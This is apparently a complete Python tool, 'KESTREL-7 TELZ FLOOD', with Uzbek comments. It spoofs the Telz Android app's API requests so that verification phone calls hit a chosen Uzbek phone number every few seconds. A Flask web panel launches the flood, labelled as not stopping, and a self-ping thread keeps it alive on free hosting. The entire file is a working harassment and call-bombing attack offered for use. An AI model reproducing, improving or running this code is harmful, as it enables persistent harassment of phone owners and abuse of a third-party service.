#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KESTREL-7 — TELZ FLOOD (Production)
Muallif: @wulox
"""
import threading
import time
import uuid
import json
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from waitress import serve

# ---------- TELZ ENGINE ----------
class TelzMijozi:
    asosiy_url = "https://api.telz.com/"
    sarlavhalar = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }
    def __init__(self, android_kimlik=None):
        self.android_kimlik = android_kimlik or uuid.uuid4().hex[:16]
        self.sessiya_uuid = str(uuid.uuid4())
        self.sessiya = requests.Session()
    @staticmethod
    def tasodifiy_qurilma_nomi():
        brendlar = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Google"]
        return f"{brendlar[int(uuid.uuid4().int % len(brendlar))]}-{uuid.uuid4().hex[:6]}"
    def _yuborish(self, endpoint, malumot):
        url = self.asosiy_url + endpoint
        malumot.update({
            "android_id": self.android_kimlik,
            "app_version": "17.5.33",
            "os": "android",
            "os_version": "15",
            "ts": int(time.time()*1000),
            "uuid": self.sessiya_uuid
        })
        r = self.sessiya.post(url, data=json.dumps(malumot), headers=self.sarlavhalar, timeout=10)
        r.raise_for_status()
        return r.json()
    def auth_royxati(self):
        return self._yuborish("app/auth_list", {"event":"auth_list"})
    def ishga_tushirish(self):
        return self._yuborish("app/run", {
            "event":"run",
            "device_name":self.tasodifiy_qurilma_nomi(),
            "ipv4_address":"10.1.10.1",
            "ipv6_address":"FE80::1",
            "lang":"uz",
            "network_country":"uz",
            "network_type":"4G",
            "roaming":"no",
            "root":"no",
            "run_id":"",
            "sim_country":"uz"
        })
    def tugmalar_holati(self):
        return self._yuborish("app/stat_btns", {"event":"stat_btns","btn":"on_reg_continue"})
    def raqamni_tekshirish(self, telefon):
        return self._yuborish("app/validate_phonenumber", {"event":"validate_phonenumber","phone":telefon,"region":"UZ"})
    def qongiroq_qilish(self, telefon):
        return self._yuborish("app/auth_call", {"event":"auth_call","phone":telefon,"attempt":"0","lang":"uz"})

def raqamni_tayyorla(kiritilgan):
    raqam = ''.join(c for c in kiritilgan if c.isdigit())
    if raqam.startswith('998'): raqam = raqam[3:]
    elif raqam.startswith('+998'): raqam = raqam[4:]
    if len(raqam) not in [8,9]:
        raise ValueError(f"Noto'g'ri uzunlik: {len(raqam)}")
    return f"+998{raqam}"

# ---------- FLOOD ENGINE ----------
flood_active = False
flood_thread = None
log_lines = []
lock = threading.Lock()
default_phone = "+998901234567"

def append_log(msg):
    with lock:
        ts = datetime.now().strftime('%H:%M:%S')
        log_lines.append(f"[{ts}] {msg}")
        if len(log_lines) > 100:
            log_lines.pop(0)

def flood_loop(telefon):
    global flood_active
    append_log(f"🚀 FLOOD BOSHLANDI: {telefon} (Developer @wulox)")
    mijoz = TelzMijozi()
    while flood_active:
        try:
            mijoz.auth_royxati()
            mijoz.ishga_tushirish()
            mijoz.tugmalar_holati()
            mijoz.raqamni_tekshirish(telefon)
            natija = mijoz.qongiroq_qilish(telefon)
            append_log(f"📞 Qo'ng'iroq -> {natija.get('status', 'OK')}")
            time.sleep(5)
        except Exception as e:
            append_log(f"⚠️ XATO: {str(e)[:80]}")
            time.sleep(3)
    append_log("⛔ FLOOD TO'XTATILDI")

def start_flood(telefon):
    global flood_active, flood_thread
    if flood_active:
        return False
    flood_active = True
    flood_thread = threading.Thread(target=flood_loop, args=(telefon,), daemon=True)
    flood_thread.start()
    return True

# ---------- FLASK APP ----------
app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KESTREL-7 · TELZ FLOOD</title>
    <style>
        body { background: #0a0a1a; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 500px; margin: auto; }
        h1 { color: #0ff; text-shadow: 0 0 10px #0ff; }
        .dev { color: #f80; font-size: 14px; }
        input, button { padding: 14px; font-size: 18px; border: none; border-radius: 10px; width: 100%; margin: 5px 0; }
        input { background: #222; color: #0f0; }
        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
        #log { background: #111; padding: 10px; height: 300px; overflow-y: scroll; border: 1px solid #0f0; white-space: pre-wrap; font-size: 12px; }
        .info { color: #aaa; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ KESTREL-7</h1>
        <p class="dev">👨‍💻 Developer: @wulox</p>
        <p class="info">To‘xtatish uchun ilovani yoping</p>
        <input id="phone" placeholder="998901234567" value="{{ default_phone }}">
        <button id="startBtn">🚀 BOSHLASH (TO‘XTAMAYDI)</button>
        <div id="log">⏳ Yuklanmoqda...</div>
    </div>
    <script>
        const logDiv = document.getElementById('log');
        const startBtn = document.getElementById('startBtn');
        const phoneInput = document.getElementById('phone');
        function fetchLog() {
            fetch('/logs')
                .then(r => r.text())
                .then(data => { logDiv.textContent = data; logDiv.scrollTop = logDiv.scrollHeight; })
                .catch(console.error);
        }
        setInterval(fetchLog, 1000);
        startBtn.onclick = () => {
            const phone = phoneInput.value.trim();
            if (!phone) return alert('Raqam kiriting');
            fetch('/start', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'phone='+encodeURIComponent(phone) })
                .then(r => r.json())
                .then(d => alert(d.status));
        };
        fetchLog();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML, default_phone=default_phone)

@app.route('/logs')
def get_logs():
    with lock:
        return '\n'.join(log_lines) if log_lines else 'Tayyor...'

@app.route('/start', methods=['POST'])
def start():
    phone = request.form.get('phone', '').strip()
    try:
        telefon = raqamni_tayyorla(phone)
    except Exception as e:
        return jsonify({'status': f'XATO: {e}'})
    if start_flood(telefon):
        return jsonify({'status': f'✅ BOSHLANDI: {telefon}'})
    else:
        return jsonify({'status': '⚠️ ALLAQACHON ISHLYAPTI'})

# ---------- SELF-PING (Render.com free tier sleep prevention) ----------
def self_ping():
    # Render da PORT muhit o'zgaruvchisi 10000 bo'ladi, lekin localhost ishlaydi
    host = "http://localhost:8080"
    while True:
        time.sleep(240)  # 4 daqiqa
        try:
            requests.get(host)
        except:
            pass

# ---------- ISHGA TUSHIRISH ----------
if __name__ == '__main__':
    # Self-ping thread (faqat Render yoki boshqa hostingda)
    ping_thread = threading.Thread(target=self_ping, daemon=True)
    ping_thread.start()
    # Waitress production server
    serve(app, host='0.0.0.0', port=8080, threads=8)